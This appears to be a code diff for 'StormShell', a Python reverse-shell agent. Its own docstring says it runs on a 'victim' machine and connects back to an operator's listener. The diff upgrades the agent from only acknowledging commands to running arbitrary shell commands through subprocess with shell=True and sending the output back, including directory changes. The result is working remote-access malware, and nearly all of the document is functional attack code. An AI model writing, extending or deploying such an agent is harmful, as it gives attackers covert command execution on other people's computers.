@@ -4,14 +4,16 @@ StormShell - Agent Module
 
 A lightweight TCP client that connects back to the StormShell listener.
 This module runs on the target (victim) machine, establishes a reverse
-TCP connection to the handler, and enters a receive loop — waiting for
-commands and sending responses back to the operator.
+TCP connection to the handler, and enters a receive loop — executing
+OS commands via subprocess and returning results to the operator.
 """
 
 import argparse
-import socket
-import sys
 import logging
+import os
+import socket
+import subprocess
+import sys
 
 # ---------------------------------------------------------------------------
 # Constants
@@ -105,17 +107,110 @@ class Agent:
             sys.exit(1)
 
     # ------------------------------------------------------------------
+    # Command execution helpers
+    # ------------------------------------------------------------------
+
+    @staticmethod
+    def _handle_cd(path: str) -> str:
+        """
+        Change the agent's working directory using os.chdir().
+
+        subprocess spawns a child process, so a 'cd' executed inside it
+        would only affect that child — not the agent itself.  This method
+        applies the directory change at the agent (parent) level.
+
+        Args:
+            path: Target directory path.  Defaults to the user's home
+                  directory when an empty string is supplied.
+
+        Returns:
+            A human-readable status message indicating success or failure.
+        """
+        target = path if path else os.path.expanduser("~")
+        try:
+            os.chdir(target)
+            cwd = os.getcwd()
+            logger.info("Changed directory to %s", cwd)
+            return f"[+] Changed directory to: {cwd}"
+        except FileNotFoundError:
+            msg = f"[!] Directory not found: {target}"
+            logger.warning(msg)
+            return msg
+        except PermissionError:
+            msg = f"[!] Permission denied: {target}"
+            logger.warning(msg)
+            return msg
+        except OSError as exc:
+            msg = f"[!] Failed to change directory: {exc}"
+            logger.error(msg)
+            return msg
+
+    @staticmethod
+    def _execute_command(command: str) -> str:
+        """
+        Execute an OS command via subprocess and return its output.
+
+        Uses ``shell=True`` so that shell built-ins and pipelines work
+        correctly.  Both stdout and stderr are captured and merged into
+        a single result string.
+
+        Args:
+            command: The raw shell command string to execute.
+
+        Returns:
+            The combined stdout + stderr output of the command, or a
+            status / error message if the command produced no output or
+            raised an exception.
+        """
+        try:
+            result = subprocess.run(
+                command,
+                shell=True,
+                capture_output=True,
+                timeout=30,
+            )
+
+            stdout = result.stdout.decode("utf-8", errors="replace").strip()
+            stderr = result.stderr.decode("utf-8", errors="replace").strip()
+
+            # Merge stdout and stderr into a single response.
+            output_parts: list[str] = []
+            if stdout:
+                output_parts.append(stdout)
+            if stderr:
+                output_parts.append(stderr)
+
+            if output_parts:
+                return "\n".join(output_parts)
+
+            # Command succeeded but produced no output (e.g. mkdir, touch).
+            return (
+                f"[+] Command executed successfully (no output). "
+                f"Exit code: {result.returncode}"
+            )
+
+        except subprocess.TimeoutExpired:
+            msg = f"[!] Command timed out: {command}"
+            logger.warning(msg)
+            return msg
+        except OSError as exc:
+            msg = f"[!] Execution error: {exc}"
+            logger.error(msg)
+            return msg
+
+    # ------------------------------------------------------------------
     # Interactive receive loop
     # ------------------------------------------------------------------
 
     def _receive_loop(self) -> None:
         """
-        Continuously listen for commands from the StormShell listener.
+        Continuously listen for commands from the StormShell listener,
+        execute them on the host operating system, and send results back.
 
         Behaviour:
-            - 'exit' command  → break out of the loop and shut down.
-            - Any other command → send an acknowledgement response back
-              to the listener.
+            - 'exit'  → break out of the loop and shut down.
+            - 'cd ..' → handled via os.chdir() for persistent effect.
+            - Others  → executed via subprocess; output returned.
         """
         logger.info("Entered receive loop — waiting for commands.")
 
@@ -136,11 +231,17 @@ class Agent:
                     logger.info("Exit command received. Shutting down.")
                     break
 
-                # For now, send back an acknowledgement to the listener.
-                response = f"[+] Command received by agent: {command}"
+                # Handle 'cd' as a special case (persistent directory change).
+                if command.lower() == "cd" or command.lower().startswith("cd "):
+                    path = command[3:].strip()
+                    response = self._handle_cd(path)
+                else:
+                    response = self._execute_command(command)
+
+                # Send the result back to the listener.
                 try:
                     self.sock.sendall(response.encode("utf-8"))
-                    logger.debug("Sent acknowledgement for: %s", command)
+                    logger.debug("Sent response (%d bytes).", len(response))
                 except (BrokenPipeError, ConnectionResetError, OSError) as exc:
                     logger.error("Failed to send response — %s", exc)
                     break
